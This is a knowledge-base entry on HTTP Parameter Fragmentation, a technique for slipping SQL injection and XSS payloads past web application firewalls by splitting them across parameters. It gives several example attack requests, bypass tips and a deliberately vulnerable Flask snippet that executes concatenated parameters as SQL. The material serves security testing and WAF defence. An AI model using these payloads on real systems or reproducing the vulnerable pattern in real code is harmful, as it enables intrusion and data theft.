---
id: WAF-EVASION-14
title: HTTP Parameter Fragmentation (HPF)
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-14: HTTP Parameter Fragmentation (HPF)

## Summary

HTTP Parameter Fragmentation (HPF) distributes an attack payload across multiple distinct parameter names rather than repeating the same parameter. Each parameter fragment appears benign to the WAF when inspected individually, but the backend application concatenates or otherwise combines the parameters into a complete malicious payload.

## When to Use

- When the backend application joins multiple parameters into a single value (e.g., constructing SQL queries from multiple form fields)
- Against WAFs that inspect each parameter independently without cross-parameter correlation
- For SQL injection, XSS, and template injection where payloads can be split across parameter boundaries
- When individual parameter length limits restrict single-parameter attacks

## Technique Details

HPF differs from HPP in that it uses different parameter names rather than repeating the same name. The backend typically concatenates parameters in alphabetical or positional order to reconstruct the payload.

Common scenarios where HPF is effective:

- Search forms that concatenate multiple input fields into a query
- Profile update forms where fields are combined into a database query
- API endpoints that merge multiple query parameters into a single expression
- Applications that use parameter name ordering (alphabetical) to build strings

## Payload Examples

```http
# HPF for XSS — fragment across parameters
GET /search?first=<script>&last=alert(1)&title=</script> HTTP/1.1
Host: target.com
# Backend: query = first + last + title -> "<script>alert(1)</script>"

# HPF for SQL injection
GET /user?id=1&col=UNION&val=SELECT&filter=1,2,3 HTTP/1.1
Host: target.com
# Backend: sql = "SELECT " + col + " FROM users WHERE " + val + "=" + filter
# Result: "SELECT UNION FROM users WHERE SELECT=1,2,3" (may be malformed but demonstrates)

# HPF targeting alphabetical concatenation
GET /api/search?a=select&b=1,2,3&c=from&d=users&e=where&f=id=1 HTTP/1.1
Host: target.com
# Backend concatenates alphabetically: a+b+c+d+e+f
# Result: "select 1,2,3 from users where id=1"

# HPF with JSON body parameters
POST /api/query HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "param1": "1",
  "param2": " union ",
  "param3": "select ",
  "param4": "1,2,3"
}
# Backend joins all param values into query string
```

```python
# Example of vulnerable backend code
# Python (Flask) — vulnerable to HPF
@app.route('/search')
def search():
    parts = []
    for key in sorted(request.args.keys()):
        parts.append(request.args.get(key))
    query = ''.join(parts)  # <-- HPF vulnerability
    result = db.execute(query)
```

```http
# HPF with comment-based joining
GET /api?q1=1/*&q2=union&q3=*/&q4=select&q5=*&q6=from&q7=users HTTP/1.1
Host: target.com
# MySQL comment trick: 1/* + union + */ + select + * + from + users
# = 1/*union*/select * from users
# SQL: 1 union select * from users
```

## Detection & Bypass Notes

**Detection:**
- WAFs that reconstruct the full parameter context by inspecting how the backend processes parameters can detect HPF.
- Behavioral WAFs that correlate parameters with backend query patterns may flag fragmented payloads.
- WAFs that limit the number of parameters can disrupt HPF attempts.

**Bypass:**
- Research the backend's parameter amalgamation logic to determine the correct fragment order.
- Use alphabetical ordering for parameters when the backend sorts them.
- Combine HPF with comment obfuscation for multi-database compatibility.
- Use HPF in conjunction with HPP for greater obfuscation depth.
- Distribute fragments across HTTP headers, cookies, and body to further evade inspection.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution
- https://portswigger.net/research/bypassing-wafs-with-parameter-fragmentation
